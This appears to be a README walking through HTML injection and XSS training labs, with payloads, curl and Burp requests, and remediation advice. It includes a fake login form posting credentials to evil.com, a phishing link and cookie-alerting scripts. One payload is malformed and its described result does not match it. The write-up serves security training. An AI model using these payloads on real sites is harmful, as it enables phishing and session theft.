# HTML Injection Labs – Technical Walkthrough

This repository contains a series of practical labs demonstrating various HTML Injection vulnerabilities. 

🔗 Documentation:
[**GitHub**](https://github.com/reyincyber/Hacktify-CS); [**Medium**](https://cyberrey.medium.com/html-injection-labs-walkthrough-hacktify-internship-8406228e9fd2); [**Youtube**](https://youtu.be/GBzzOPzwKU4)

## Table of Contents

1. [Sub-lab-1: HTML’s are easy!](#sub-lab-1-htmls-are-easy)
2. [Sub-lab-2: Let me Store them!](#sub-lab-2-let-me-store-them)
3. [Sub-lab-3: File Names are also vulnerable!](#sub-lab-3-file-names-are-also-vulnerable)
4. [Sub-lab-4: File Content and HTML Injection a perfect pair!](#sub-lab-4-file-content-and-html-injection-a-perfect-pair)
5. [Sub-lab-2.5: Injecting HTML using URL](#sub-lab-25-injecting-html-using-url)
6. [Sub-lab-2.6: Encode IT!](#sub-lab-26-encode-it)
7. [Using a Terminal or Burp Suite/OWASP ZAP](#using-a-terminal-or-burp-suiteowasp-zap)
8. [Remediation and Best Practices](#remediation-and-best-practices)
9. [References](#references)

---
## Sub-lab Goals
1. Test every entry point on a target website.
2. Refer to the HTML Injection Documentation.
3. Verify valid HTML Injection appears on screen.

### Each sub-lab provides:
- **Risk Rating:** - High/Medium/Low
- **Vulnerable URL** – The target endpoint for testing.
- **Vulnerability Description** – How the vulnerability manifests.
- **Proof of Concept** – Step-by-step details on how the vulnerability was discovered and exploited.

## Tools Used
- Manual Testing/Browser Developer Tools (Inspect Element)
- Burp Suite/OWASP ZAP
- Text Editor
---

## Sub-lab-1: HTML’s are easy!

**Risk Rating:** Low

### Vulnerable URL
```
https://labs.hacktify.in/HTML/html_lab/lab_1/html_injection_1.php
```

### Vulnerability Description
The form submits *User Input in search Field* to html_injection_1.php via POST. If html_injection_1.php does not properly sanitize or escape user input, an attacker could inject malicious HTML or JavaScript.

### How It Was Discovered
- **Example 1:** Injecting HTML elements:
  ```html
  <h1 style="color:red;">Hacked!</h1>
  ```
  *Effect:* Alters the page structure.
  
- **Example 2:** Injecting a malicious link:
  ```html
  <a href="http://evil.com">Click here for free money!</a>
  ```
  *Effect:* Can be used for phishing attacks.

---

## Sub-lab-2: Let me Store them!

**Risk Rating:** Low

### Vulnerable URL
```
https://labs.hacktify.in/HTML/html_lab/lab_2/html_injection_2.php
https://labs.hacktify.in/HTML/html_lab/lab_2/profile.php
```

### Vulnerability Description
Stored HTML Injection vulnerability allows attackers to inject and store malicious HTML content in user profile fields, which later gets executed when the profile page is viewed. This could lead to UI defacement, phishing, or stored XSS attacks

### How It Was Discovered
Modified the First Name field with:
  ```html
  <h1 style="color:red;">Hacked!</h1>
  ```
  The payload was successfully stored and rendered on the profile page without sanitization.

---

## Sub-lab-3: File Names are also vulnerable!

**Risk Rating:** High

### Vulnerable URL
```
https://labs.hacktify.in/HTML/html_lab/lab_3/html_injection_3.php
```

### Vulnerability Description
- **File Name Injection:** The application does not properly sanitize user-provided file names before storage or display.
- **Impact:** Malicious file names containing HTML/JavaScript execute when rendered, leading to stored HTML injection or stored XSS.

### How It Was Discovered
- Uploaded a file with a modified filename:
  - HTML payload: `<h1 style="color:red;">Hacked!</h1>.png`
  - JavaScript payload: `<script>alert('XSS!')</script>.png`
- The file name was reflected on the page without sanitization, demonstrating the vulnerability.

---

## Sub-lab-4: File Content and HTML Injection a perfect pair!

**Risk Rating:** High

### Vulnerable URL
```
https://labs.hacktify.in/HTML/html_lab/lab_4/html_injection_4.php
```

### Vulnerability Description
- **File Upload Exploit:** The application allows file uploads without proper sanitization of file names.
- **Impact:** Attackers can craft file names that include malicious HTML or JavaScript, resulting in code execution when displayed.

### How It Was Discovered
1. **Create a malicious file:**
   - Filename example: `malicious.html`
   - Payload example: Contains malicious HTML code.
     ```
     <form action="http://evil.com/steal.php" method"POST">
       <input type="text" name="username" placeholder="Enter Username">
       <input type="password" name=password"" placeholder="Enter Password">
       <input type="submit" value="Logine">
     </form>
     ```
2. Use the file **upload** feature, and navigate to the page where the uploaded file is listed.
3. **Observation:** The injected code executed, triggering an alert box with the message `XSS`.
---

## Sub-lab-2.5: Injecting HTML using URL

**Risk Rating:** High

### Vulnerable URL
```
http://labs.hacktify.in/HTML/html_lab/lab_5/html_injection_5.php
```

### Vulnerability Description
- **URL Parameter Injection:** User-supplied data in the URL is not properly sanitized.
- **Impact:** Attackers can inject malicious HTML code via URL parameters.

### How It Was Discovered
- **Testing the URL:**
  - Appended parameter example:
    ```
    ?name=<h1>Injected</h1>
    ```
  - Another payload example:
    ```html
    <script>alert(document.cookie)</script>
    ```
- The application reflected the injected content and, in the second case, displayed the user session cookie.

---

## Sub-lab-2.6: Encode IT!

**Risk Rating:** High

### Vulnerable URL
```
https://labs.hacktify.in/HTML/html_lab/lab_6/html_injection_6.php
```

### Vulnerability Description
- **Encoding Failure:** The application does not properly encode user input in the search functionality.
- **Impact:** Attackers can inject encoded HTML or JavaScript that executes in the user's browser context.

### How It Was Discovered
Injecting a plain HTML payload into the search field did not execute the payload, thus I used a URL Percent encoder to encode the following:
``` <script>alert('XSS');</script> ``` becomes ``` %3Cscript%3Ealert%28%27XSS%27%29%3B%3C%2Fscript%3E```
while 
``` <script>alert(document.cookie)</script> ``` becomes ```%3Cscript%3Ealert(document.cookie)%3C/script%3E ```
The script executed upon rendering the encoded payload, highlighting the risks of improper input handling and encoding.

---

## Using a Terminal or Burp Suite/OWASP ZAP

### Example 1: Testing HTML Injection via a Form (Sub-lab-1)
Use cURL to simulate a POST request with malicious payload:
```bash
curl -X POST \
  -d "search=<h1 style='color:red;'>Hacked!</h1>" \
  https://labs.hacktify.in/HTML/html_lab/lab_1/html_injection_1.php
```
### Example 2: Testing Encoded Input (Sub-lab-2.6)
Simulate a GET request with URL-encoded payload:
```bash
curl "https://labs.hacktify.in/HTML/html_lab/lab_6/html_injection_6.php?search=%3Cscript%3Ealert('XSS')%3B%3C%2Fscript%3E"
```

### Example 3: Using Burp Suite to Modify URL Parameters (Sub-lab-2.5)
1. **Intercept the Request:** Open Burp Suite and set your browser proxy.
2. **Modify the URL Parameter:** Change the parameter in the intercepted request:
     ```
     GET /HTML/html_lab/lab_5/html_injection_5.php?name=<h1>Injected</h1> HTTP/1.1
     ```
3. **Forward the Request:** Observe the response to confirm the injection.
---

## Remediation and Best Practices
To prevent HTML Injection, developers should implement strong input validation and output encoding.

*Regular Audits:* Continuously perform security assessments and update code practices according to the latest security guidelines.

*Output Encoding:* Use functions such as `htmlspecialchars()` in PHP to safely render user inputs.

*Input Validation/whitelisting allowed inputs:* Always sanitize and validate user inputs on both client and server sides.
  ```
    $input = htmlspecialchars($_POST['user_input'], ENT_QUOTES, 'UTF-8');
  ```

*Escape Output Properly:*
  ```
echo htmlentities($user_input, ENT_QUOTES, 'UTF-8');
  ```

*Content Security Policy (CSP):* Implement CSP headers to mitigate the impact of potential injections.
  ```
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
  ```

---

## References

- [OWASP HTML Injection Information](https://owasp.org/www-community/Injection_Information)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
---

## License
This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

*For any questions or contributions, please open an issue or submit a pull request.*
